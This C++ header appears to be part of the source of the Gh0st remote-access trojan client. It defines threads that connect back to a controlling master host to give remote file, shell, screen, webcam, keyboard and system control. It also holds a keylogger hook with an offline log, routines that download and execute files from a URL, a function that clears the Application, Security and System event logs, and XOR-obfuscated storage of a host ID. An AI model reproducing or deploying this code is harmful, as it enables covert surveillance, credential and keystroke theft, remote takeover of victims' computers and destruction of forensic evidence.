#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "until.h"
#include "install.h"

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);
	
	socketClient.run_event_loop();
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	char	strKeyboardOfflineRecord[MAX_PATH];
	GetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
	lstrcat(strKeyboardOfflineRecord, "\\syslog.dat");
	
	if (GetFileAttributes(strKeyboardOfflineRecord) != INVALID_FILE_ATTRIBUTES)
		g_bSignalHook = true;
	else
		g_bSignalHook = false;

	while (1)
	{
		while (g_bSignalHook == false)Sleep(100);
		CKeyboardManager::StartHook();
		while (g_bSignalHook == true)Sleep(100);
		CKeyboardManager::StopHook();
	}

	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	if (URLDownloadToFile(NULL, lpURL, lpFileName, 0, NULL) != S_OK)
		return false;

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return true;
}

bool UpdateServer(LPCTSTR lpURL)
{
	char	*lpFileName = NULL;

	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	if (URLDownloadToFile(NULL, lpURL, lpFileName, 0, NULL) != S_OK)
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	CreateProcess(lpFileName, "Gh0st Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return true;
}
bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;

	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (lstrlen(strIEPath) == 0)
		return false;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 

	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return 0;
}

void CleanEvent()
{

	char *strEventName[] = {"Application", "Security", "System"};

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpHostID)
{
	DWORD	dwBytesWrite = 0;
	char	strIDFile[MAX_PATH];
	GetSystemDirectory(strIDFile, sizeof(strIDFile));
	lstrcat(strIDFile, "\\user.dat");


	char	strTempPath[MAX_PATH];
	GetTempPath(sizeof(strTempPath), strTempPath);
	lstrcat(strTempPath, "\\user.tmp");

	// 随便加下密吧
	int	len = lstrlen(lpHostID) + 1;
	char	*lpEncodeString = new char[lstrlen(lpHostID) + 1];
	lstrcpy(lpEncodeString, lpHostID);
	for (int i = 0; i < len; i++)
		lpEncodeString[i] ^= 0x90;

	HANDLE	hFile = CreateFile(strTempPath, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFile, lpEncodeString, len, &dwBytesWrite, NULL);
	}
	CloseHandle(hFile);

	MoveFile(strTempPath, strIDFile);
	DeleteFile(strTempPath);
}


#endif // !defined(AFX_LOOP_H_INCLUDED)
